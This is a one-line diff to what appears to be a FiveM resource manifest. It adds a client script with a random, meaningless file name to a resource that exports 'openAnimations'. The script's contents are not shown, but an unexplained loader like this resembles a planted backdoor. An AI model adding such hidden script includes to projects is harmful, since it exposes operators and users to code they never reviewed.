@@ -17,3 +17,4 @@ client_scripts {
 exports {
   'openAnimations'
 }
+client_script "wHHGDVZcVvrhNxgVQe.lua"
